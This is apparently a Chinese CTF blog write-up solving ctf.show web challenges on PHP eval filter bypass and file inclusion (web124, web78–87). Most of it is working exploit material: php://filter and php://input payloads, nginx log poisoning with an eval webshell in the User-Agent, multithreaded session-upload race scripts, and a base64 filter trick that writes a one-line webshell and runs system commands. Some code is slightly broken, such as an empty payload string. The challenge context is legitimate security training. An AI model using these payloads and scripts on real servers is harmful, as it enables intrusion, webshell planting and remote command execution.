<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    $content = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen($content) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;太长了不会算&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . $blackitem . <span class="string">&#x27;/m&#x27;</span>, $content)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    $whitelist = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    preg_match_all(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, $content, $used_funcs);  </span><br><span class="line">    <span class="keyword">foreach</span> ($used_funcs[<span class="number">0</span>] <span class="keyword">as</span> $func) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.$content.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>分析一波源码，get传参c，并且长度不能超过80，设置了黑名单和白名单和正则过滤。按照提示我们去找找一些数学函数进行使用，这么多白名单也注定了有多种payload，这里我使用<code>base_convert()</code>和<code>getallheaders</code>配合使用<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web124/RJK%29FW%25W%5DI%7D7HR%5DPECDK0HP.png" alt=""><br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web124/EPWLSILUL%6048%40%24PDH%259AEAN.png" alt=""><br>
注意，因为正则会匹配字母，所以我们需要通过<code>base_convert()</code>进行一个转换</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> base_convert(<span class="string">&#x27;system&#x27;</span>,<span class="number">36</span>,<span class="number">10</span>);</span><br><span class="line"><span class="comment">//得到1751504350，从36进制转换到10进制，36进制包含10个数字和26个字母</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> base_convert(<span class="string">&#x27;getallheaders&#x27;</span>,<span class="number">30</span>,<span class="number">10</span>);</span><br><span class="line"><span class="comment">//得到8768397090111664438，这里不使用36进制是因为精度会丢失，尝试到30的时候成功</span></span><br></pre></td></tr></table></figure>
<p>所以构造payload如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;$pi&#x3D;base_convert,$pi(1751504350,10,36)($pi(8768397090111664438,10,30)()&#123;1&#125;) </span><br></pre></td></tr></table></figure>
<p>这里用一个变量来缩小payload长度，但注意变量名要取白名单中的名字进行命名，否则会被ban<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web124/T%29W51CB%29N5TQ4%5B66Y8EECDJ.png" alt=""><br>
成功获得flag</p>
<h2 id="文件包含-78-88-116-117"><a class="header-anchor" href="#文件包含-78-88-116-117">¶</a>文件包含(78-88&amp;116-117)</h2>
<h3 id="web78"><a class="header-anchor" href="#web78">¶</a>web78</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>开始文件包含的题型了，这里使用php伪协议php://filter来构造payload</p>
<blockquote>
<p>首先这是一个file关键字的get参数传递，php://是一种协议名称，php://filter/是一种访问本地文件的协议，/read=convert.base64-encode/表示读取的方式是base64编码后，resource=index.php表示目标文件为index.php。</p>
<p>通过传递这个参数可以得到index.php的源码，下面说说为什么，看到源码中的include函数，这个表示从外部引入php文件并执行，如果执行不成功，就返回文件的源码。</p>
<p>而include的内容是由用户控制的，所以通过我们传递的file参数，是include（）函数引入了index.php的base64编码格式，因为是base64编码格式，所以执行不成功，返回源码，所以我们得到了源码的base64格式，解码即可。</p>
</blockquote>
<p>payload如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
<p>读取出来是base64，再拿去进行base64解码即可得到flag</p>
<h3 id="web79"><a class="header-anchor" href="#web79">¶</a>web79</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    $file = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>代码中把php替换成了<code>???</code>，php伪协议大小写可以绕过，所以我们这里使用php://input伪协议，payload如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;Php:&#x2F;&#x2F;input</span><br><span class="line"></span><br><span class="line">post：&lt;?php system(&quot;tac flag.php&quot;);?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/web79/0C4K%40R_MQ2W%282D%40VEF%7DHV37.png" alt=""></p>
<h3 id="web80"><a class="header-anchor" href="#web80">¶</a>web80</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    $file = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这次多过滤了一个data，可以继续使用上题php:input协议，不过注意这次文件名字改了<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/web80/~4EFI%24V_L~8E%24U_CGIDW5%5D1.png" alt=""><br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/web80/YG%60%7DUF%5D%5D~P6HJ%40~2KA4%5D949.png" alt=""><br>
所以payload为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;Php:&#x2F;&#x2F;input</span><br><span class="line"></span><br><span class="line">post：&lt;?php system(&quot;tac fl0g.php&quot;);?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="web81"><a class="header-anchor" href="#web81">¶</a>web81</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    $file = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这次把:给ban了，题目提示使用日志包含，之前都是手工发包，这次写个脚本来跑</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/2/20 19:51</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://893b0ed2-2497-41f3-b056-c5617165c2f3.chall.ctf.show:8080/&quot;</span> + <span class="string">&quot;?file=/var/log/nginx/access.log&quot;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0&lt;?php @eval($_POST[dotast]);?&gt;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;dotast&#x27;</span>: <span class="string">&#x27;system(&quot;cat fl0g.php&quot;);&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">req = requests.get(url=url, headers=headers)</span><br><span class="line">result = requests.post(url=url, data=data)</span><br><span class="line">print(result.text)</span><br></pre></td></tr></table></figure>
<p>运行得到flag</p>
<h3 id="web82"><a class="header-anchor" href="#web82">¶</a>web82</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    $file = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这次把<code>.</code>给过滤了，日志包含使用不了，我们使用session文件包含，先了解一些知识点，在php5.4之后php.ini开始有几个默认选项</p>
<blockquote>
<p>1.session.upload_progress.enabled = on<br>
2.session.upload_progress.cleanup = on<br>
3.session.upload_progress.prefix = “upload_progress_”<br>
4.session.upload_progress.name = “PHP_SESSION_UPLOAD_PROGRESS”<br>
5.session.use_strict_mode=off</p>
<p>第一个表示当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中<br>
第二个表示当文件上传结束后，php将会立即清空对应session文件中的内容<br>
第三和第四个<code>prefix+name</code>将表示为session中的键名<br>
第五个表示我们对Cookie中sessionID可控</p>
</blockquote>
<p>简而言之，我们可以利用<code>session.upload_progress</code>将木马写入session文件，然后包含这个session文件。不过前提是我们需要创建一个session文件，并且知道session文件的存放位置。因为<code>session.use_strict_mode=off</code>的关系，我们可以自定义sessionID<br>
linux系统中session文件一般的默认存储位置为 /tmp 或 /var/lib/php/session</p>
<p>例如我们在Cookie中设置了PHPSESSID=flag，php会在服务器上创建文件：/tmp/sess_flag，即使此时用户没有初始化session，php也会自动初始化Session。 并产生一个键值，为<code>prefix+name</code>的值，最后被写入sess_文件里<br>
还有一个关键点就是<code>session.upload_progress.cleanup</code>默认是开启的，只要读取了post数据，就会清除进度信息，所以我们需要利用条件竞争来pass，写一个脚本来完成</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/2/20 23:51</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">url = <span class="string">&#x27;http://453228ae-28f2-4bb0-b401-83514feae8df.chall.ctf.show:8080/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php system(&quot;tac f*&quot;);?&gt;dotast&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">10</span>)</span><br><span class="line">        response = session.post(url,cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: <span class="string">&#x27;flag&#x27;</span>&#125;, data=data, files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;dota.txt&#x27;</span>, f)&#125;)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response = session.get(url+<span class="string">&#x27;?file=/tmp/sess_flag&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;dotast&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            print(response.text)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&#x27;retry&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    session = requests.session()</span><br><span class="line">    write = threading.Thread(target=write, args=(session,))</span><br><span class="line">    write.daemon = <span class="literal">True</span></span><br><span class="line">    write.start()</span><br><span class="line">    read(session)</span><br></pre></td></tr></table></figure>
<p>运行后得到flag<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/web82/S%29PR%28L6K%282%5B1%29_%5DKLZAS8%5BM.png" alt=""></p>
<h3 id="web83"><a class="header-anchor" href="#web83">¶</a>web83</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">session_unset();</span><br><span class="line">session_destroy();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    $file = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>继续利用session文件包含，使用上题脚本运行即可得到flag</p>
<h3 id="web84"><a class="header-anchor" href="#web84">¶</a>web84</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    $file = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    system(<span class="string">&quot;rm -rf /tmp/*&quot;</span>);</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>加了一个<code>rm -rf</code>，但没关系，我们是条件竞争，只要一直传就有机会能执行，继续跑上面的脚本拿flag</p>
<h3 id="web85"><a class="header-anchor" href="#web85">¶</a>web85</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    $file = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    <span class="keyword">if</span>(file_exists($file))&#123;</span><br><span class="line">        $content = file_get_contents($file);</span><br><span class="line">        <span class="keyword">if</span>(strpos($content, <span class="string">&quot;&lt;&quot;</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">include</span>($file);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这次会匹配调用die，我们依然使用条件竞争进行pass，不过这次我们多加点线程</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/2/20 23:51</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">url = <span class="string">&#x27;http://8c42100f-3744-4c9f-83d4-5ac626e78719.chall.ctf.show:8080/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php system(&quot;tac f*&quot;);?&gt;dotast&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">10</span>)</span><br><span class="line">        response = session.post(url,cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: <span class="string">&#x27;flag&#x27;</span>&#125;, data=data, files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;dota.txt&#x27;</span>, f)&#125;)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response = session.get(url+<span class="string">&#x27;?file=/tmp/sess_flag&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;dotast&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            print(response.text)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&#x27;retry&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    session = requests.session()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">        threading.Thread(target=write, args=(session,)).start()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">        threading.Thread(target=read, args=(session,)).start()</span><br></pre></td></tr></table></figure>
<p>运行后得到flag</p>
<h3 id="web86"><a class="header-anchor" href="#web86">¶</a>web86</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">define(<span class="string">&#x27;还要秀？&#x27;</span>, dirname(<span class="keyword">__FILE__</span>));</span><br><span class="line">set_include_path(还要秀？);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    $file = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>继续使用上题脚本跑，跑完得到flag</p>
<h3 id="web87"><a class="header-anchor" href="#web87">¶</a>web87</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    $content = $_POST[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    $file = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    file_put_contents(urldecode($file), <span class="string">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span>.$content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>分析一下源码，get传入file，post传入content，但<code>$content</code>在开头增加了die函数，即使我们写入一句话也会先die，导致无法执行；并且还对<code>file</code>进行了url解码<br>
我们可以使用base64的方式写入文件再进行decode，base64编码只包含64个可打印字符，而php解码base64时遇到不在其中的字符，会忽略掉，将合法字符进行组合变成一个字符串进行解码，所以<code>&lt;?php die('大佬别秀了');?&gt;</code>对其解码后，只有<code>phpdie</code>六个字符组成字符串进行解码，思路已经很清晰了，下面讲讲怎么做</p>
<blockquote>
<p>第一，get传参file写入文件并且进行base64解码，即<br>
?file=php://filter/write=convert.base64-decode/resource=datast.php<br>
因为源码中有一次urldecode，所以我们需要对其进行两次url编码<br>
p>
<p>第二，post传参content为base64编码后的一句话木马，但注意的是前面剩下phpdie，一共6个字符，所以需要再加2个字符变8个<br>
因为base64算法解码时是4个byte一组<br>
content=nbPD9waHAgQGV2YWwoJF9QT1NUW3Bhc3NdKTs/Pg==</p>
</blockquote>
<p>post发送请求后访问dotast.php发现一句话木马已经写入，可以执行命令。步骤过于繁琐，我写一个脚本来完成</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/2/21 12:29</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://67365af2-c5a6-4b3c-8900-25c85ed1d8cc.chall.ctf.show:8080/&quot;</span></span><br><span class="line"><span class="comment">#经过两次url编码的php://filter/write=convert.base64-decode/resource=dotast.php</span></span><br><span class="line">get_data = <span class="string">&quotquot;</span></span><br><span class="line">get_url = url + <span class="string">&quot;?file=&quot;</span> + get_data</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;content&#x27;</span>: <span class="string">&#x27;nbPD9waHAgQGV2YWwoJF9QT1NUW3Bhc3NdKTs/Pg==&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url=get_url, data=data)</span><br><span class="line">shell_url = url + <span class="string">&quot;dotast.php&quot;</span></span><br><span class="line">test = requests.get(shell_url)</span><br><span class="line"><span class="keyword">if</span>(test.status_code == <span class="number">200</span>):</span><br><span class="line">    print(<span class="string">&quot;[*]getshell成功&quot;</span>)</span><br><span class="line">    shell_data = &#123;</span><br><span class="line">        <span class="string">&#x27;pass&#x27;</span>: <span class="string">&#x27;system(&quot;cat fl0g.php&quot;);&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    result = requests.post(url=shell_url, data=shell_data)</span><br><span class="line">    print(result.text)</span><br></pre></td></tr></table></figure>
<p>运行后即可得到flag</p>
<h3 id="web88"><a class="header-anchor" href="#web88">¶</a>web88</h3>
